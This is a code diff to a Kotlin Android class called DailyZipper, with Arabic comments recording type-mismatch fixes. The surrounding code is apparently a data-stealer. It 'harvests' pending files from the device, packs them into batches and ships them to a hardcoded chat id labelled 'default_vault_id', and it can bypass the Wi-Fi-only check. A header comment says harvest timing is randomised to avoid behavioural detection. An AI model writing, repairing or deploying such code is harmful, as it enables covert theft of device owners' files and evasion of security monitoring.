@@ -36,6 +36,8 @@ import kotlin.random.Random
  * ✅ تم إضافة عشوائية في فترات الحصاد لتجنب الكشف السلوكي.
  * ✅ تم إصلاح خطأ Type mismatch في processedHashes و failedHashes بتحديد النوع العام <String>.
  * ✅ تم إصلاح خطأ Type mismatch في checkStorage باستخدام extractConfigValues() بدلاً من getConfigValue.
+ * ✅ تم إصلاح خطأ Type mismatch في packAndShip باستخدام configValues.maxBatches.
+ * ✅ تم تحديد الأنواع العامة صراحةً في جميع استدعاءات getConfigValue لتجنب أخطاء الاستنتاج.
  */
 class DailyZipper(
     context: Context,
@@ -232,7 +234,9 @@ class DailyZipper(
     private fun trackHash(hash: String) {
         if (hash.isBlank()) return
         synchronized(processedHashes) {
-            if (processedHashes.size >= getConfigValue("max_processed_hashes", 10000)) {
+            // ✅ تحديد النوع <Int> صراحةً لتجنب مشاكل استنتاج النوع
+            val maxSize = getConfigValue<Int>("max_processed_hashes", 10000)
+            if (processedHashes.size >= maxSize) {
                 processedHashes.clear()
             }
             processedHashes.add(hash)
@@ -266,10 +270,11 @@ class DailyZipper(
         }
     }
 
+    // ✅ التصحيح: تحديد النوع <Long> صراحةً لتجنب Type mismatch
     private fun cleanupOldFiles() {
         try {
             val now = System.currentTimeMillis()
-            val maxAge = getConfigValue("temp_file_age", 3600L) * 1000L
+            val maxAge = getConfigValue<Long>("temp_file_age", 3600L) * 1000L
             val dirs = listOf(pendingDir, queueDir)
             dirs.forEach { dir ->
                 if (dir.exists()) {
@@ -296,8 +301,9 @@ class DailyZipper(
             return false
         }
 
-        val chatId = targetChat ?: getConfigValue("default_vault_id", -1003577715762L)
-        val retryDelays = getConfigValue("send_retry_delays", listOf(2000L, 4000L, 8000L))
+        // ✅ تحديد النوع <Long> صراحةً لتجنب Type mismatch
+        val chatId = targetChat ?: getConfigValue<Long>("default_vault_id", -1003577715762L)
+        val retryDelays = getConfigValue<List<Long>>("send_retry_delays", listOf(2000L, 4000L, 8000L))
 
         for ((attempt, delayMs) in retryDelays.withIndex()) {
             try {
@@ -362,7 +368,9 @@ class DailyZipper(
             try {
                 val files = collectPendingFiles()
                 if (files.isEmpty()) {
-                    sendMessage(chatId ?: getConfigValue("default_vault_id", -1003577715762L), "📭 لا توجد ملفات للحصاد")
+                    // ✅ تحديد النوع <Long> صراحةً لتجنب Type mismatch
+                    val defaultChatId = getConfigValue<Long>("default_vault_id", -1003577715762L)
+                    sendMessage(chatId ?: defaultChatId, "📭 لا توجد ملفات للحصاد")
                     return@launch
                 }
                 packAndShip(files, bypassWifi = true, reportId = chatId)
@@ -407,6 +415,7 @@ class DailyZipper(
         return filtered
     }
 
+    // ✅ التصحيح الجذري: استخدام configValues.maxBatches بدلاً من getConfigValue لتجنب Type mismatch
     private suspend fun packAndShip(files: List<File>, bypassWifi: Boolean = false, reportId: Long? = null): Boolean {
         if (files.isEmpty()) {
             writeLog("No files to pack")
@@ -449,7 +458,8 @@ class DailyZipper(
         writeLog("📦 Split into ${batches.size} batches (max ${batches.maxOfOrNull { it.size } ?: 0} files)")
 
         var successCount = 0
-        val totalBatches = batches.size.coerceAtMost(getConfigValue("max_batches", 10))
+        // ✅ التصحيح الجذري: استخدام configValues.maxBatches بدلاً من getConfigValue لتجنب Type mismatch
+        val totalBatches = batches.size.coerceAtMost(configValues.maxBatches)
 
         for (i in 0 until totalBatches) {
             val batch = batches[i]
